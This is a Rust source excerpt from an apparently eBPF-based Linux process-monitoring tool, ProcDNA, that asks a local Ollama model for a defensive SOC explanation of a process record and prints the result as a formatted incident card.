async fn explain_with_local_llm(
    ollama_url: &str,
    model: &str,
    passport: &ProcessPassport,
) -> Result<String> {
    let passport_json = serde_json::to_string_pretty(passport)?;

    let system_prompt = r#"
You are a local SOC analyst assistant.

You analyze Linux process passports generated by an eBPF-based security layer.

Rules:
- Use only the provided data.
- Do not invent facts.
- Do not provide offensive instructions.
- Focus on defensive analysis.
- Keep the explanation concise and useful for a SOC analyst.
"#;

    let user_prompt = format!(
        r#"
Analyze this Linux process passport.

Return:
1. One-sentence incident summary
2. Likely scenario
3. Why this matters
4. Recommended defensive actions
5. Evidence to preserve

Process Passport:
{}
"#,
        passport_json
    );

    let body = json!({
        "model": model,
        "stream": false,
        "messages": [
            {
                "role": "system",
                "content": system_prompt
            },
            {
                "role": "user",
                "content": user_prompt
            }
        ]
    });

    let client = reqwest::Client::new();
    let url = format!("{}/api/chat", ollama_url.trim_end_matches('/'));

    let response: serde_json::Value = client
        .post(url)
        .json(&body)
        .send()
        .await
        .context("failed to call Ollama API")?
        .error_for_status()
        .context("Ollama returned non-success status")?
        .json()
        .await
        .context("failed to parse Ollama response")?;

    let content = response
        .get("message")
        .and_then(|m| m.get("content"))
        .and_then(|c| c.as_str())
        .unwrap_or("No AI response content returned.");

    Ok(content.to_string())
}

fn print_incident_card(passport: &ProcessPassport, ai_report: &str) {
    println!();
    println!("╔════════════════════════════════════════════════════════════╗");
    println!("║                         ProcDNA                           ║");
    println!("║              AI-Native Linux Process Passport             ║");
    println!("╠════════════════════════════════════════════════════════════╣");
    println!("║ Host: {:<52} ║", passport.host_id);
    println!("║ PID: {:<53} ║", passport.pid);
    println!("║ Process: {:<49} ║", passport.process_name);
    println!("║ UID: {:<53} ║", passport.uid);
    println!("║ Severity: {:<48} ║", passport.severity());
    println!("║ Risk Score: {:<46} ║", format!("{}/100", passport.risk_score));
    println!("╠════════════════════════════════════════════════════════════╣");
    println!("║ Process DNA                                               ║");
    println!("║ {} ║", truncate(&passport.parent_chain.join(" → "), 58));
    println!("╠════════════════════════════════════════════════════════════╣");
    println!("║ Files touched                                             ║");
    for file in &passport.files_touched {
        println!("║ - {:<55} ║", truncate(file, 55));
    }
    println!("╠════════════════════════════════════════════════════════════╣");
    println!("║ Network connections                                       ║");
    for conn in &passport.network_connections {
        println!("║ - {:<55} ║", truncate(conn, 55));
    }
    println!("╠════════════════════════════════════════════════════════════╣");
    println!("║ Risk reasons                                              ║");
    for reason in &passport.risk_reasons {
        println!("║ - {:<55} ║", truncate(&reason.description, 55));
    }
    println!("╠════════════════════════════════════════════════════════════╣");
    println!("║ Local AI Explanation                                      ║");
    println!("╚════════════════════════════════════════════════════════════╝");
    println!();
    println!("{}", ai_report.trim());
    println!();
}

fn truncate(value: &str, max: usize) -> String {
    if value.chars().count() <= max {
        return value.to_string();
    }

    let mut out = value.chars().take(max.saturating_sub(3)).collect::<String>();
    out.push_str("...");
    out
}
